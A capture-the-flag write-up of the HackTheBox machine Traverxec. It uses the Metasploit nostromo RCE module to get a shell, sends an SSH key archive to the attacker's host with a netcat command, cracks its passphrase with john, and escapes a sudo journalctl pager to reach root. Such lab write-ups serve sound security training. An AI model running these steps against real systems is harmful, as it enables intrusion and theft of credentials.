---
title: "Traverxec | HackTheBox"
collection: publications
permalink: /publication/traverxec
excerpt: 'This is a retired machine from HackTheBox'
date: 2023-08-03
venue: '08-03'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/traverxec_header.png)

**LINK:** [Traverxec](https://app.hackthebox.com/machines/Traverxec)

---

## Enumeration : 

Let's scan the target with nmap : 

```bash
nmap -sV -sC -A -p- 10.10.10.165
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 06:19 EDT
Nmap scan report for 10.10.10.165
Host is up (0.19s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
|   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
|_  256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 5.1 (92%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

the scan reveals 2 open ports :
 * ``SSH`` running on port 22.
 * ``Nostromo`` web server running on port 80.


* Visiting ``http://10.10.10.165``, we see this web page.

![traverxec1](/images/traverxec1.png)

# Initial foothold : 

* I spent some time exploring the web page( source code, hidden directories...) but i didn't find anything interesting.

* One of the information that we found earlier was the version of ``nostromo`` which is ``1.9.6``, a quick research on google i found that this version of ``nostromo`` is vulnerable to ``remote code execution``.

>[Exploit-DB](https://www.exploit-db.com/exploits/47837)
>[Rapid7](https://www.rapid7.com/db/modules/exploit/multi/http/nostromo_code_exec/)

* I used ``metasploit`` to exploit this vulnerability, you can also use the python exploit that we found on ``Exploit-DB``.
* Let's fire up metasploit and choose the module related to this vulnerability

```bash
# msfconsole
msf > use exploit/multi/http/nostromo_code_exec
```

* Time to set some options before we exploit the server.

```bash
msf exploit(multi/http/nostromo_code_exec) > set target 1
msf exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
msf exploit(multi/http/nostromo_code_exec) > set LHOST <your-ip-address>
msf exploit(multi/http/nostromo_code_exec) > exploit
```

* After few seconds, we got the shell as ``www-data`` user.

![traverexec2](/images/traverexec2.png)


# User Flag : 

* Next step is to escalate our shell to ``David's``.
* Visiting the ``/var/nostromo/conf`` directory, we see a file named ``nhttpd.conf`` contains the web server configuration.

```bash
[snip]
# HOMEDIRS [OPTIONAL]

homedirs /home
homedirs_public public_www
[snip]
```

* This configuration indicates that there might be a folder named ``public_www`` in the user's home directory, earlier i did notice that the david's home directory is not readable, however the ``public_www`` is readable.

* the ``public_www`` folder contains a subfolder named ``protected-file-area`` where i found a compressed file named ``backup-ssh-identity-files.tgz``.

![traverexec3](/images/traverexec3.png)

* There are a lot of ways to transfer the compressed file to our local machine, i used ``netcat`` for this purpose.

* on our local machine : 

```bash
# nc -lvp 1234 > backup-ssh-identity-files.tgz
```
* On the victim machine : 

```bash
# nc <your-ip-address> 1234 < backup-ssh-identity-files.tgz
```

* Since it's a tar archive, let's use ``tar`` command to extract it.

```bash
# tar -xvf backup-ssh-identity-files.tgz
```

![traverexec4](/images/traverexec4.png)

* I found the private key for ``SSH``, so maybe we can login as ``david``.

```bash
chmod 400 id_rsa
```

* Unfortunately the privte key is encrypted so we need the passphrase.

![traverexec5](/images/traverexec5.png)

* let's try to crack it with ``john``, first we will extract the hash from the private key.

```bash
# ssh2john id_rsa > id.hash 
```

* Time to crack it 

![traverexec6](/images/traverexec6.png)

* Now that we have the passphrase let's login.

![traverexec7](/images/traverexec7.png)


# Root Flag : 

* There is a folder called ``bin`` inside david's home directory, let's examine the ``server-stats.sh`` script.

![traverexec8](/images/traverexec8.png)

* We can see that the last command is executed using ``sudo``, after executing the script we can see that it displays the last 5 lines of the nostromo service logs using journalctl.

* A quick visit to [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/#sudo), i found out that ``journactl`` is exploitable because it invokes the default pager which is likely to be ``less``, the ``less`` command waits for user input after displaying the output so at that moment we can spawn a shell as sudo.

* before running the following command, you should resize the screen by maximizing it in order to spawn the shell : 

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

![traverexec9](/images/traverexec9.png)

* Enter the following command : 

```bash
!/bin/bash
```

![traverexec10](/images/traverexec10.png)

* Now it's time to get the root flag

![traverexec11](/images/traverexec11.png)












